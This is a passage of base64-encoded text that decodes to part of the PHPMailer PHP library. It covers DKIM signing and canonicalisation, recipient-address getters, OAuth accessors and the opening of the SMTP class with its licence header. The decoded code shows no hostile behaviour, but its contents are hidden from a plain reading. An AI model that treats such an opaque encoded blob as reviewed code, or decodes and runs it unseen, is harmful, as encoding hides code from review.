AgICAgICAgICAgIGlmICgoKDB4MjEgPD0gJG9yZCkgYW5kICgkb3JkIDw9IDB4M0EpKSBvciAkb3JkID09IDB4M0Mgb3IgKCgweDNFIDw9ICRvcmQpIGFuZCAoJG9yZCA8PSAweDdFKSkpIHsKICAgICAgICAgICAgICAgICRsaW5lIC49ICR0eHRbJGldOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgJGxpbmUgLj0gJz0nIC4gc3ByaW50ZignJTAyWCcsICRvcmQpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiAkbGluZTsKICAgIH0KICAgIC8qKgogICAgICogR2VuZXJhdGUgYSBES0lNIHNpZ25hdHVyZS4KICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzaWduSGVhZGVyCiAgICAgKgogICAgICogQHRocm93cyBFeGNlcHRpb24KICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZyBUaGUgREtJTSBzaWduYXR1cmUgdmFsdWUKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIERLSU1fU2lnbigkc2lnbkhlYWRlcikKICAgIHsKICAgICAgICBpZiAoIWRlZmluZWQoJ1BLQ1M3X1RFWFQnKSkgewogICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2V4dGVuc2lvbl9taXNzaW5nJykgLiAnb3BlbnNzbCcpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiAnJzsKICAgICAgICB9CiAgICAgICAgJHByaXZLZXlTdHIgPSAhZW1wdHkoJHRoaXMtPkRLSU1fcHJpdmF0ZV9zdHJpbmcpID8KICAgICAgICAgICAgJHRoaXMtPkRLSU1fcHJpdmF0ZV9zdHJpbmcgOgogICAgICAgICAgICBmaWxlX2dldF9jb250ZW50cygkdGhpcy0+REtJTV9wcml2YXRlKTsKICAgICAgICBpZiAoJycgIT0gJHRoaXMtPkRLSU1fcGFzc3BocmFzZSkgewogICAgICAgICAgICAkcHJpdktleSA9IG9wZW5zc2xfcGtleV9nZXRfcHJpdmF0ZSgkcHJpdktleVN0ciwgJHRoaXMtPkRLSU1fcGFzc3BocmFzZSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJHByaXZLZXkgPSBvcGVuc3NsX3BrZXlfZ2V0X3ByaXZhdGUoJHByaXZLZXlTdHIpOwogICAgICAgIH0KICAgICAgICBpZiAob3BlbnNzbF9zaWduKCRzaWduSGVhZGVyLCAkc2lnbmF0dXJlLCAkcHJpdktleSwgJ3NoYTI1NldpdGhSU0FFbmNyeXB0aW9uJykpIHsKICAgICAgICAgICAgb3BlbnNzbF9wa2V5X2ZyZWUoJHByaXZLZXkpOwogICAgICAgICAgICByZXR1cm4gYmFzZTY0X2VuY29kZSgkc2lnbmF0dXJlKTsKICAgICAgICB9CiAgICAgICAgb3BlbnNzbF9wa2V5X2ZyZWUoJHByaXZLZXkpOwogICAgICAgIHJldHVybiAnJzsKICAgIH0KICAgIC8qKgogICAgICogR2VuZXJhdGUgYSBES0lNIGNhbm9uaWNhbGl6YXRpb24gaGVhZGVyLgogICAgICogVXNlcyB0aGUgJ3JlbGF4ZWQnIGFsZ29yaXRobSBmcm9tIFJGQzYzNzYgc2VjdGlvbiAzLjQuMi4KICAgICAqIENhbm9uaWNhbGl6ZWQgaGVhZGVycyBzaG91bGQgKmFsd2F5cyogdXNlIENSTEYsIHJlZ2FyZGxlc3Mgb2YgbWFpbGVyIHNldHRpbmcuCiAgICAgKgogICAgICogQHNlZSAgICBodHRwczovL3Rvb2xzLmlldGYub3JnL2h0bWwvcmZjNjM3NiNzZWN0aW9uLTMuNC4yCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkc2lnbkhlYWRlciBIZWFkZXIKICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gREtJTV9IZWFkZXJDKCRzaWduSGVhZGVyKQogICAgewogICAgICAgIC8vVW5mb2xkIGFsbCBoZWFkZXIgY29udGludWF0aW9uIGxpbmVzCiAgICAgICAgLy9BbHNvIGNvbGxhcHNlcyBmb2xkZWQgd2hpdGVzcGFjZS4KICAgICAgICAvL05vdGUgUENSRSBccyBpcyB0b28gYnJvYWQgYSBkZWZpbml0aW9uIG9mIHdoaXRlc3BhY2U7IFJGQzUzMjIgZGVmaW5lcyBpdCBhcyBgWyBcdF1gCiAgICAgICAgLy9Ac2VlIGh0dHBzOi8vdG9vbHMuaWV0Zi5vcmcvaHRtbC9yZmM1MzIyI3NlY3Rpb24tMi4yCiAgICAgICAgLy9UaGF0IG1lYW5zIHRoaXMgbWF5IGJyZWFrIGlmIHlvdSBkbyBzb21ldGhpbmcgZGFmdCBsaWtlIHB1dCB2ZXJ0aWNhbCB0YWJzIGluIHlvdXIgaGVhZGVycy4KICAgICAgICAkc2lnbkhlYWRlciA9IHByZWdfcmVwbGFjZSgnL1xyXG5bIFx0XSsvJywgJyAnLCAkc2lnbkhlYWRlcik7CiAgICAgICAgJGxpbmVzID0gZXhwbG9kZSgiXHJcbiIsICRzaWduSGVhZGVyKTsKICAgICAgICBmb3JlYWNoICgkbGluZXMgYXMgJGtleSA9PiAkbGluZSkgewogICAgICAgICAgICAvL0lmIHRoZSBoZWFkZXIgaXMgbWlzc2luZyBhIDosIHNraXAgaXQgYXMgaXQncyBpbnZhbGlkCiAgICAgICAgICAgIC8vVGhpcyBpcyBsaWtlbHkgdG8gaGFwcGVuIGJlY2F1c2UgdGhlIGV4cGxvZGUoKSBhYm92ZSB3aWxsIGFsc28gc3BsaXQKICAgICAgICAgICAgLy9vbiB0aGUgdHJhaWxpbmcgTEUsIGxlYXZpbmcgYW4gZW1wdHkgbGluZQogICAgICAgICAgICBpZiAoc3RycG9zKCRsaW5lLCAnOicpID09PSBmYWxzZSkgewogICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgbGlzdCgkaGVhZGluZywgJHZhbHVlKSA9IGV4cGxvZGUoJzonLCAkbGluZSwgMik7CiAgICAgICAgICAgIC8vTG93ZXItY2FzZSBoZWFkZXIgbmFtZQogICAgICAgICAgICAkaGVhZGluZyA9IHN0cnRvbG93ZXIoJGhlYWRpbmcpOwogICAgICAgICAgICAvL0NvbGxhcHNlIHdoaXRlIHNwYWNlIHdpdGhpbiB0aGUgdmFsdWUKICAgICAgICAgICAgJHZhbHVlID0gcHJlZ19yZXBsYWNlKCcvWyBcdF17Mix9LycsICcgJywgJHZhbHVlKTsKICAgICAgICAgICAgLy9SRkM2Mzc2IGlzIHNsaWdodGx5IHVuY2xlYXIgaGVyZSAtIGl0IHNheXMgdG8gZGVsZXRlIHNwYWNlIGF0IHRoZSAqZW5kKiBvZiBlYWNoIHZhbHVlCiAgICAgICAgICAgIC8vQnV0IHRoZW4gc2F5cyB0byBkZWxldGUgc3BhY2UgYmVmb3JlIGFuZCBhZnRlciB0aGUgY29sb24uCiAgICAgICAgICAgIC8vTmV0IHJlc3VsdCBpcyB0aGUgc2FtZSBhcyB0cmltbWluZyBib3RoIGVuZHMgb2YgdGhlIHZhbHVlLgogICAgICAgICAgICAvL2J5IGVsaW1pbmF0aW9uLCB0aGUgc2FtZSBhcHBsaWVzIHRvIHRoZSBmaWVsZCBuYW1lCiAgICAgICAgICAgICRsaW5lc1ska2V5XSA9IHRyaW0oJGhlYWRpbmcsICIgXHQiKSAuICc6JyAuIHRyaW0oJHZhbHVlLCAiIFx0Iik7CiAgICAgICAgfQogICAgICAgIHJldHVybiBpbXBsb2RlKCJcclxuIiwgJGxpbmVzKTsKICAgIH0KICAgIC8qKgogICAgICogR2VuZXJhdGUgYSBES0lNIGNhbm9uaWNhbGl6YXRpb24gYm9keS4KICAgICAqIFVzZXMgdGhlICdzaW1wbGUnIGFsZ29yaXRobSBmcm9tIFJGQzYzNzYgc2VjdGlvbiAzLjQuMy4KICAgICAqIENhbm9uaWNhbGl6ZWQgYm9kaWVzIHNob3VsZCAqYWx3YXlzKiB1c2UgQ1JMRiwgcmVnYXJkbGVzcyBvZiBtYWlsZXIgc2V0dGluZy4KICAgICAqCiAgICAgKiBAc2VlICAgIGh0dHBzOi8vdG9vbHMuaWV0Zi5vcmcvaHRtbC9yZmM2Mzc2I3NlY3Rpb24tMy40LjMKICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICRib2R5IE1lc3NhZ2UgQm9keQogICAgICoKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBES0lNX0JvZHlDKCRib2R5KQogICAgewogICAgICAgIGlmIChlbXB0eSgkYm9keSkpIHsKICAgICAgICAgICAgcmV0dXJuICJcclxuIjsKICAgICAgICB9CiAgICAgICAgLy8gTm9ybWFsaXplIGxpbmUgZW5kaW5ncyB0byBDUkxGCiAgICAgICAgJGJvZHkgPSBzdGF0aWM6Om5vcm1hbGl6ZUJyZWFrcygkYm9keSwgIlxyXG4iKTsKICAgICAgICAvL1JlZHVjZSBtdWx0aXBsZSB0cmFpbGluZyBsaW5lIGJyZWFrcyB0byBhIHNpbmdsZSBvbmUKICAgICAgICByZXR1cm4gcnRyaW0oJGJvZHksICJcclxuIikgLiAiXHJcbiI7CiAgICB9CiAgICAvKioKICAgICAqIENyZWF0ZSB0aGUgREtJTSBoZWFkZXIgYW5kIGJvZHkgaW4gYSBuZXcgbWVzc2FnZSBoZWFkZXIuCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkaGVhZGVyc19saW5lIEhlYWRlciBsaW5lcwogICAgICogQHBhcmFtIHN0cmluZyAkc3ViamVjdCAgICAgIFN1YmplY3QKICAgICAqIEBwYXJhbSBzdHJpbmcgJGJvZHkgICAgICAgICBCb2R5CiAgICAgKgogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIERLSU1fQWRkKCRoZWFkZXJzX2xpbmUsICRzdWJqZWN0LCAkYm9keSkKICAgIHsKICAgICAgICAkREtJTXNpZ25hdHVyZVR5cGUgPSAncnNhLXNoYTI1Nic7IC8vIFNpZ25hdHVyZSAmIGhhc2ggYWxnb3JpdGhtcwogICAgICAgICRES0lNY2Fub25pY2FsaXphdGlvbiA9ICdyZWxheGVkL3NpbXBsZSc7IC8vIENhbm9uaWNhbGl6YXRpb24gb2YgaGVhZGVyL2JvZHkKICAgICAgICAkREtJTXF1ZXJ5ID0gJ2Rucy90eHQnOyAvLyBRdWVyeSBtZXRob2QKICAgICAgICAkREtJTXRpbWUgPSB0aW1lKCk7IC8vIFNpZ25hdHVyZSBUaW1lc3RhbXAgPSBzZWNvbmRzIHNpbmNlIDAwOjAwOjAwIC0gSmFuIDEsIDE5NzAgKFVUQyB0aW1lIHpvbmUpCiAgICAgICAgJHN1YmplY3RfaGVhZGVyID0gIlN1YmplY3Q6ICRzdWJqZWN0IjsKICAgICAgICAkaGVhZGVycyA9IGV4cGxvZGUoc3RhdGljOjokTEUsICRoZWFkZXJzX2xpbmUpOwogICAgICAgICRmcm9tX2hlYWRlciA9ICcnOwogICAgICAgICR0b19oZWFkZXIgPSAnJzsKICAgICAgICAkZGF0ZV9oZWFkZXIgPSAnJzsKICAgICAgICAkY3VycmVudCA9ICcnOwogICAgICAgICRjb3BpZWRIZWFkZXJGaWVsZHMgPSAnJzsKICAgICAgICAkZm91bmRFeHRyYUhlYWRlcnMgPSBbXTsKICAgICAgICAkZXh0cmFIZWFkZXJLZXlzID0gJyc7CiAgICAgICAgJGV4dHJhSGVhZGVyVmFsdWVzID0gJyc7CiAgICAgICAgJGV4dHJhQ29weUhlYWRlckZpZWxkcyA9ICcnOwogICAgICAgIGZvcmVhY2ggKCRoZWFkZXJzIGFzICRoZWFkZXIpIHsKICAgICAgICAgICAgaWYgKHN0cnBvcygkaGVhZGVyLCAnRnJvbTonKSA9PT0gMCkgewogICAgICAgICAgICAgICAgJGZyb21faGVhZGVyID0gJGhlYWRlcjsKICAgICAgICAgICAgICAgICRjdXJyZW50ID0gJ2Zyb21faGVhZGVyJzsKICAgICAgICAgICAgfSBlbHNlaWYgKHN0cnBvcygkaGVhZGVyLCAnVG86JykgPT09IDApIHsKICAgICAgICAgICAgICAgICR0b19oZWFkZXIgPSAkaGVhZGVyOwogICAgICAgICAgICAgICAgJGN1cnJlbnQgPSAndG9faGVhZGVyJzsKICAgICAgICAgICAgfSBlbHNlaWYgKHN0cnBvcygkaGVhZGVyLCAnRGF0ZTonKSA9PT0gMCkgewogICAgICAgICAgICAgICAgJGRhdGVfaGVhZGVyID0gJGhlYWRlcjsKICAgICAgICAgICAgICAgICRjdXJyZW50ID0gJ2RhdGVfaGVhZGVyJzsKICAgICAgICAgICAgfSBlbHNlaWYgKCFlbXB0eSgkdGhpcy0+REtJTV9leHRyYUhlYWRlcnMpKSB7CiAgICAgICAgICAgICAgICBmb3JlYWNoICgkdGhpcy0+REtJTV9leHRyYUhlYWRlcnMgYXMgJGV4dHJhSGVhZGVyKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKHN0cnBvcygkaGVhZGVyLCAkZXh0cmFIZWFkZXIgLiAnOicpID09PSAwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRoZWFkZXJWYWx1ZSA9ICRoZWFkZXI7CiAgICAgICAgICAgICAgICAgICAgICAgIGZvcmVhY2ggKCR0aGlzLT5DdXN0b21IZWFkZXIgYXMgJGN1c3RvbUhlYWRlcikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRjdXN0b21IZWFkZXJbMF0gPT09ICRleHRyYUhlYWRlcikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRoZWFkZXJWYWx1ZSA9IHRyaW0oJGN1c3RvbUhlYWRlclswXSkgLgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICc6ICcgLgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5lbmNvZGVIZWFkZXIodHJpbSgkY3VzdG9tSGVhZGVyWzFdKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgJGZvdW5kRXh0cmFIZWFkZXJzWyRleHRyYUhlYWRlcl0gPSAkaGVhZGVyVmFsdWU7CiAgICAgICAgICAgICAgICAgICAgICAgICRjdXJyZW50ID0gJyc7CiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJCRjdXJyZW50KSBhbmQgc3RycG9zKCRoZWFkZXIsICcgPT8nKSA9PT0gMCkgewogICAgICAgICAgICAgICAgICAgICQkY3VycmVudCAuPSAkaGVhZGVyOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkY3VycmVudCA9ICcnOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGZvcmVhY2ggKCRmb3VuZEV4dHJhSGVhZGVycyBhcyAka2V5ID0+ICR2YWx1ZSkgewogICAgICAgICAgICAkZXh0cmFIZWFkZXJLZXlzIC49ICc6JyAuICRrZXk7CiAgICAgICAgICAgICRleHRyYUhlYWRlclZhbHVlcyAuPSAkdmFsdWUgLiAiXHJcbiI7CiAgICAgICAgICAgIGlmICgkdGhpcy0+REtJTV9jb3B5SGVhZGVyRmllbGRzKSB7CiAgICAgICAgICAgICAgICAkZXh0cmFDb3B5SGVhZGVyRmllbGRzIC49ICJcdHwiIC4gc3RyX3JlcGxhY2UoJ3wnLCAnPTdDJywgJHRoaXMtPkRLSU1fUVAoJHZhbHVlKSkgLiAiO1xyXG4iOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmICgkdGhpcy0+REtJTV9jb3B5SGVhZGVyRmllbGRzKSB7CiAgICAgICAgICAgICRmcm9tID0gc3RyX3JlcGxhY2UoJ3wnLCAnPTdDJywgJHRoaXMtPkRLSU1fUVAoJGZyb21faGVhZGVyKSk7CiAgICAgICAgICAgICR0byA9IHN0cl9yZXBsYWNlKCd8JywgJz03QycsICR0aGlzLT5ES0lNX1FQKCR0b19oZWFkZXIpKTsKICAgICAgICAgICAgJGRhdGUgPSBzdHJfcmVwbGFjZSgnfCcsICc9N0MnLCAkdGhpcy0+REtJTV9RUCgkZGF0ZV9oZWFkZXIpKTsKICAgICAgICAgICAgJHN1YmplY3QgPSBzdHJfcmVwbGFjZSgnfCcsICc9N0MnLCAkdGhpcy0+REtJTV9RUCgkc3ViamVjdF9oZWFkZXIpKTsKICAgICAgICAgICAgJGNvcGllZEhlYWRlckZpZWxkcyA9ICJcdHo9JGZyb21cclxuIiAuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiXHR8JHRvXHJcbiIgLgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIlx0fCRkYXRlXHJcbiIgLgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIlx0fCRzdWJqZWN0O1xyXG4iIC4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRleHRyYUNvcHlIZWFkZXJGaWVsZHM7CiAgICAgICAgfQogICAgICAgICRib2R5ID0gJHRoaXMtPkRLSU1fQm9keUMoJGJvZHkpOwogICAgICAgICRES0lNbGVuID0gc3RybGVuKCRib2R5KTsgLy8gTGVuZ3RoIG9mIGJvZHkKICAgICAgICAkREtJTWI2NCA9IGJhc2U2NF9lbmNvZGUocGFjaygnSConLCBoYXNoKCdzaGEyNTYnLCAkYm9keSkpKTsgLy8gQmFzZTY0IG9mIHBhY2tlZCBiaW5hcnkgU0hBLTI1NiBoYXNoIG9mIGJvZHkKICAgICAgICBpZiAoJycgPT0gJHRoaXMtPkRLSU1faWRlbnRpdHkpIHsKICAgICAgICAgICAgJGlkZW50ID0gJyc7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJGlkZW50ID0gJyBpPScgLiAkdGhpcy0+REtJTV9pZGVudGl0eSAuICc7JzsKICAgICAgICB9CiAgICAgICAgJGRraW1oZHJzID0gJ0RLSU0tU2lnbmF0dXJlOiB2PTE7IGE9JyAuCiAgICAgICAgICAgICRES0lNc2lnbmF0dXJlVHlwZSAuICc7IHE9JyAuCiAgICAgICAgICAgICRES0lNcXVlcnkgLiAnOyBsPScgLgogICAgICAgICAgICAkREtJTWxlbiAuICc7IHM9JyAuCiAgICAgICAgICAgICR0aGlzLT5ES0lNX3NlbGVjdG9yIC4KICAgICAgICAgICAgIjtcclxuIiAuCiAgICAgICAgICAgICJcdHQ9IiAuICRES0lNdGltZSAuICc7IGM9JyAuICRES0lNY2Fub25pY2FsaXphdGlvbiAuICI7XHJcbiIgLgogICAgICAgICAgICAiXHRoPUZyb206VG86RGF0ZTpTdWJqZWN0IiAuICRleHRyYUhlYWRlcktleXMgLiAiO1xyXG4iIC4KICAgICAgICAgICAgIlx0ZD0iIC4gJHRoaXMtPkRLSU1fZG9tYWluIC4gJzsnIC4gJGlkZW50IC4gIlxyXG4iIC4KICAgICAgICAgICAgJGNvcGllZEhlYWRlckZpZWxkcyAuCiAgICAgICAgICAgICJcdGJoPSIgLiAkREtJTWI2NCAuICI7XHJcbiIgLgogICAgICAgICAgICAiXHRiPSI7CiAgICAgICAgJHRvU2lnbiA9ICR0aGlzLT5ES0lNX0hlYWRlckMoCiAgICAgICAgICAgICRmcm9tX2hlYWRlciAuICJcclxuIiAuCiAgICAgICAgICAgICR0b19oZWFkZXIgLiAiXHJcbiIgLgogICAgICAgICAgICAkZGF0ZV9oZWFkZXIgLiAiXHJcbiIgLgogICAgICAgICAgICAkc3ViamVjdF9oZWFkZXIgLiAiXHJcbiIgLgogICAgICAgICAgICAkZXh0cmFIZWFkZXJWYWx1ZXMgLgogICAgICAgICAgICAkZGtpbWhkcnMKICAgICAgICApOwogICAgICAgICRzaWduZWQgPSAkdGhpcy0+REtJTV9TaWduKCR0b1NpZ24pOwogICAgICAgIHJldHVybiBzdGF0aWM6Om5vcm1hbGl6ZUJyZWFrcygkZGtpbWhkcnMgLiAkc2lnbmVkKSAuIHN0YXRpYzo6JExFOwogICAgfQogICAgLyoqCiAgICAgKiBEZXRlY3QgaWYgYSBzdHJpbmcgY29udGFpbnMgYSBsaW5lIGxvbmdlciB0aGFuIHRoZSBtYXhpbXVtIGxpbmUgbGVuZ3RoCiAgICAgKiBhbGxvd2VkIGJ5IFJGQyAyODIyIHNlY3Rpb24gMi4xLjEuCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkc3RyCiAgICAgKgogICAgICogQHJldHVybiBib29sCiAgICAgKi8KICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gaGFzTGluZUxvbmdlclRoYW5NYXgoJHN0cikKICAgIHsKICAgICAgICByZXR1cm4gKGJvb2wpIHByZWdfbWF0Y2goJy9eKC57JyAuIChzZWxmOjpNQVhfTElORV9MRU5HVEggKyBzdHJsZW4oc3RhdGljOjokTEUpKSAuICcsfSkvbScsICRzdHIpOwogICAgfQogICAgLyoqCiAgICAgKiBBbGxvd3MgZm9yIHB1YmxpYyByZWFkIGFjY2VzcyB0byAndG8nIHByb3BlcnR5LgogICAgICogQmVmb3JlIHRoZSBzZW5kKCkgY2FsbCwgcXVldWVkIGFkZHJlc3NlcyAoaS5lLiB3aXRoIElETikgYXJlIG5vdCB5ZXQgaW5jbHVkZWQuCiAgICAgKgogICAgICogQHJldHVybiBhcnJheQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0VG9BZGRyZXNzZXMoKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+dG87CiAgICB9CiAgICAvKioKICAgICAqIEFsbG93cyBmb3IgcHVibGljIHJlYWQgYWNjZXNzIHRvICdjYycgcHJvcGVydHkuCiAgICAgKiBCZWZvcmUgdGhlIHNlbmQoKSBjYWxsLCBxdWV1ZWQgYWRkcmVzc2VzIChpLmUuIHdpdGggSUROKSBhcmUgbm90IHlldCBpbmNsdWRlZC4KICAgICAqCiAgICAgKiBAcmV0dXJuIGFycmF5CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRDY0FkZHJlc3NlcygpCiAgICB7CiAgICAgICAgcmV0dXJuICR0aGlzLT5jYzsKICAgIH0KICAgIC8qKgogICAgICogQWxsb3dzIGZvciBwdWJsaWMgcmVhZCBhY2Nlc3MgdG8gJ2JjYycgcHJvcGVydHkuCiAgICAgKiBCZWZvcmUgdGhlIHNlbmQoKSBjYWxsLCBxdWV1ZWQgYWRkcmVzc2VzIChpLmUuIHdpdGggSUROKSBhcmUgbm90IHlldCBpbmNsdWRlZC4KICAgICAqCiAgICAgKiBAcmV0dXJuIGFycmF5CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRCY2NBZGRyZXNzZXMoKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+YmNjOwogICAgfQogICAgLyoqCiAgICAgKiBBbGxvd3MgZm9yIHB1YmxpYyByZWFkIGFjY2VzcyB0byAnUmVwbHlUbycgcHJvcGVydHkuCiAgICAgKiBCZWZvcmUgdGhlIHNlbmQoKSBjYWxsLCBxdWV1ZWQgYWRkcmVzc2VzIChpLmUuIHdpdGggSUROKSBhcmUgbm90IHlldCBpbmNsdWRlZC4KICAgICAqCiAgICAgKiBAcmV0dXJuIGFycmF5CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRSZXBseVRvQWRkcmVzc2VzKCkKICAgIHsKICAgICAgICByZXR1cm4gJHRoaXMtPlJlcGx5VG87CiAgICB9CiAgICAvKioKICAgICAqIEFsbG93cyBmb3IgcHVibGljIHJlYWQgYWNjZXNzIHRvICdhbGxfcmVjaXBpZW50cycgcHJvcGVydHkuCiAgICAgKiBCZWZvcmUgdGhlIHNlbmQoKSBjYWxsLCBxdWV1ZWQgYWRkcmVzc2VzIChpLmUuIHdpdGggSUROKSBhcmUgbm90IHlldCBpbmNsdWRlZC4KICAgICAqCiAgICAgKiBAcmV0dXJuIGFycmF5CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRBbGxSZWNpcGllbnRBZGRyZXNzZXMoKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+YWxsX3JlY2lwaWVudHM7CiAgICB9CiAgICAvKioKICAgICAqIFBlcmZvcm0gYSBjYWxsYmFjay4KICAgICAqCiAgICAgKiBAcGFyYW0gYm9vbCAgICRpc1NlbnQKICAgICAqIEBwYXJhbSBhcnJheSAgJHRvCiAgICAgKiBAcGFyYW0gYXJyYXkgICRjYwogICAgICogQHBhcmFtIGFycmF5ICAkYmNjCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzdWJqZWN0CiAgICAgKiBAcGFyYW0gc3RyaW5nICRib2R5CiAgICAgKiBAcGFyYW0gc3RyaW5nICRmcm9tCiAgICAgKiBAcGFyYW0gYXJyYXkgICRleHRyYQogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZG9DYWxsYmFjaygkaXNTZW50LCAkdG8sICRjYywgJGJjYywgJHN1YmplY3QsICRib2R5LCAkZnJvbSwgJGV4dHJhKQogICAgewogICAgICAgIGlmICghZW1wdHkoJHRoaXMtPmFjdGlvbl9mdW5jdGlvbikgYW5kIGlzX2NhbGxhYmxlKCR0aGlzLT5hY3Rpb25fZnVuY3Rpb24pKSB7CiAgICAgICAgICAgIGNhbGxfdXNlcl9mdW5jKCR0aGlzLT5hY3Rpb25fZnVuY3Rpb24sICRpc1NlbnQsICR0bywgJGNjLCAkYmNjLCAkc3ViamVjdCwgJGJvZHksICRmcm9tLCAkZXh0cmEpOwogICAgICAgIH0KICAgIH0KICAgIC8qKgogICAgICogR2V0IHRoZSBPQXV0aCBpbnN0YW5jZS4KICAgICAqCiAgICAgKiBAcmV0dXJuIE9BdXRoCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRPQXV0aCgpCiAgICB7CiAgICAgICAgcmV0dXJuICR0aGlzLT5vYXV0aDsKICAgIH0KICAgIC8qKgogICAgICogU2V0IGFuIE9BdXRoIGluc3RhbmNlLgogICAgICoKICAgICAqIEBwYXJhbSBPQXV0aCAkb2F1dGgKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHNldE9BdXRoKE9BdXRoICRvYXV0aCkKICAgIHsKICAgICAgICAkdGhpcy0+b2F1dGggPSAkb2F1dGg7CiAgICB9Cn0KCi8qKgogKiBQSFBNYWlsZXIgUkZDODIxIFNNVFAgZW1haWwgdHJhbnNwb3J0IGNsYXNzLgogKiBQSFAgVmVyc2lvbiA1LjUuCiAqCiAqIEBzZWUgICAgICAgaHR0cHM6Ly9naXRodWIuY29tL1BIUE1haWxlci9QSFBNYWlsZXIvIFRoZSBQSFBNYWlsZXIgR2l0SHViIHByb2plY3QKICoKICogQGF1dGhvciAgICBNYXJjdXMgQm9pbnRvbiAoU3luY2hyby9jb29sYnJ1KSA8cGhwbWFpbGVyQHN5bmNocm9tZWRpYS5jby51az4KICogQGF1dGhvciAgICBKaW0gSmFnaWVsc2tpIChqaW1qYWcpIDxqaW1qYWdAZ21haWwuY29tPgogKiBAYXV0aG9yICAgIEFuZHkgUHJldm9zdCAoY29kZXdvcnh0ZWNoKSA8Y29kZXdvcnh0ZWNoQHVzZXJzLnNvdXJjZWZvcmdlLm5ldD4KICogQGF1dGhvciAgICBCcmVudCBSLiBNYXR6ZWxsZSAob3JpZ2luYWwgZm91bmRlcikKICogQGNvcHlyaWdodCAyMDEyIC0gMjAxNyBNYXJjdXMgQm9pbnRvbgogKiBAY29weXJpZ2h0IDIwMTAgLSAyMDEyIEppbSBKYWdpZWxza2kKICogQGNvcHlyaWdodCAyMDA0IC0gMjAwOSBBbmR5IFByZXZvc3QKICogQGxpY2Vuc2UgICBodHRwOi8vd3d3LmdudS5vcmcvY29weWxlZnQvbGVzc2VyLmh0bWwgR05VIExlc3NlciBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlCiAqIEBub3RlICAgICAgVGhpcyBwcm9ncmFtIGlzIGRpc3RyaWJ1dGVkIGluIHRoZSBob3BlIHRoYXQgaXQgd2lsbCBiZSB1c2VmdWwgLSBXSVRIT1VUCiAqIEFOWSBXQVJSQU5UWTsgd2l0aG91dCBldmVuIHRoZSBpbXBsaWVkIHdhcnJhbnR5IG9mIE1FUkNIQU5UQUJJTElUWSBvcgogKiBGSVRORVNTIEZPUiBBIFBBUlRJQ1VMQVIgUFVSUE9TRS4KICovCgovKioKICogUEhQTWFpbGVyIFJGQzgyMSBTTVRQIGVtYWlsIHRyYW5zcG9ydCBjbGFzcy4KICogSW1wbGVtZW50cyBSRkMgODIxIFNNVFAgY29tbWFuZHMgYW5kIHByb3ZpZGVzIHNvbWUgdXRpbGl0eSBtZXRob2RzIGZvciBzZW5kaW5nIG1haWwgdG8gYW4gU01UUCBzZXJ2ZXIuCiAqCiAqIEBhdXRob3IgIENocmlzIFJ5YW4KICogQGF1dGhvciAgTWFyY3VzIEJvaW50b24gPHBocG1haWxlckBzeW5jaHJvbWVkaWEuY28udWs+CiAqLwpjbGFzcyBTTVRQCnsKICAvKioKICAgKiB